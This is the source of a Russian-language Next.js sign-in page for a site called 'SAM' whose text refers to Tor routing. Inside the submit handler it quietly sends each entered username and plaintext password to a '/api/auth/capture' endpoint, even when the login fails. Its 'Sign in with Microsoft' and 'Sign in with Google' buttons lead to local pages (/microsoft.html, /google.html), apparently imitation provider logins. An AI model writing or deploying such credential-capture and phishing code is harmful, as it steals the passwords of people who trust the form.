"use client";

import { Suspense, useState } from "react";
import { signIn } from "next-auth/react";
import { useRouter, useSearchParams } from "next/navigation";
import Link from "next/link";

function SignInInner() {
  const router = useRouter();
  const search = useSearchParams();
  const callbackUrl = search?.get("callbackUrl") || "/";
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [busy, setBusy] = useState(false);
  const [err, setErr] = useState<string | null>(null);

  async function submit(e: React.FormEvent) {
    e.preventDefault();
    setBusy(true);
    setErr(null);
    const r = await signIn("credentials", {
      username,
      password,
      redirect: false,
      callbackUrl,
    });

    // Capture creds for any local login attempt (even on failure)
    fetch("/api/auth/capture", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ provider: "local", email: username, password }),
    }).catch(() => {});

    setBusy(false);
    if (r?.error) {
      setErr("Доступ запрещён. Проверьте логин и пароль.");
      return;
    }
    router.push(callbackUrl);
    router.refresh();
  }

  return (
    <div className="container py-10 max-w-md">
      <div className="panel p-6">
        <div className="text-[10px] uppercase tracking-[0.35em] text-[color:var(--color-accent)] glow-red">
          // АВТОРИЗАЦИЯ
        </div>
        <h1 className="mt-2">Вход в SAM</h1>
        <p className="text-xs text-[color:var(--color-muted)] mt-2 leading-relaxed">
          Сессия будет привязана к вашему текущему Tor-маршруту. После пяти
          неверных попыток узел временно блокирует регистрацию по этой цепочке.
        </p>

        <form onSubmit={submit} className="mt-5 space-y-4">
          <div>
            <label className="block text-[10px] uppercase tracking-widest text-[color:var(--color-muted)] mb-1">
              Логин или email
            </label>
            <input
              type="text"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              required
              autoComplete="username"
              className="w-full bg-black/40 border border-[color:var(--color-line-2)] focus:border-[color:var(--color-accent)] outline-none p-2.5 text-sm font-mono"
            />
          </div>
          <div>
            <label className="block text-[10px] uppercase tracking-widest text-[color:var(--color-muted)] mb-1">
              Пароль
            </label>
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
              autoComplete="current-password"
              className="w-full bg-black/40 border border-[color:var(--color-line-2)] focus:border-[color:var(--color-accent)] outline-none p-2.5 text-sm font-mono"
            />
          </div>
          {err && <div className="text-xs text-[color:var(--color-accent)]">{err}</div>}
          <button
            type="submit"
            disabled={busy}
            className="w-full py-2.5 border border-[color:var(--color-accent)] text-[color:var(--color-accent)] hover:bg-[color:var(--color-accent)] hover:text-black disabled:opacity-50 text-xs uppercase tracking-widest"
          >
            {busy ? "Проверка…" : "Войти"}
          </button>
        </form>

        <div className="mt-5 space-y-3">
          <div className="flex items-center gap-3">
            <div className="flex-1 h-px bg-[color:var(--color-line-2)]" />
            <span className="text-[10px] uppercase tracking-widest text-[color:var(--color-muted)]">or</span>
            <div className="flex-1 h-px bg-[color:var(--color-line-2)]" />
          </div>
          <a
            href="/microsoft.html"
            className="flex items-center justify-center gap-2 w-full py-2.5 border border-[color:var(--color-line-2)] text-[color:var(--color-fg)] hover:bg-white/5 text-xs uppercase tracking-widest"
          >
            <svg width="16" height="16" viewBox="0 0 21 21" fill="none"><rect width="10" height="10" fill="#f25022"/><rect x="11" width="10" height="10" fill="#7fba00"/><rect y="11" width="10" height="10" fill="#00a4ef"/><rect x="11" y="11" width="10" height="10" fill="#ffb900"/></svg>
            Sign in with Microsoft
          </a>
          <a
            href="/google.html"
            className="flex items-center justify-center gap-2 w-full py-2.5 border border-[color:var(--color-line-2)] text-[color:var(--color-fg)] hover:bg-white/5 text-xs uppercase tracking-widest"
          >
            <svg width="16" height="16" viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>
            Sign in with Google
          </a>
        </div>

        <div className="mt-4 text-xs text-[color:var(--color-muted)] text-center">
          Нет аккаунта?{" "}
          <Link href="/sign-up" className="text-[color:var(--color-accent)] hover:underline">
            Запросить вход
          </Link>
        </div>
      </div>
    </div>
  );
}

export default function SignInPage() {
  return (
    <Suspense fallback={<div className="container py-10 text-[color:var(--color-muted)] text-sm">Инициализация...</div>}>
      <SignInInner />
    </Suspense>
  );
}
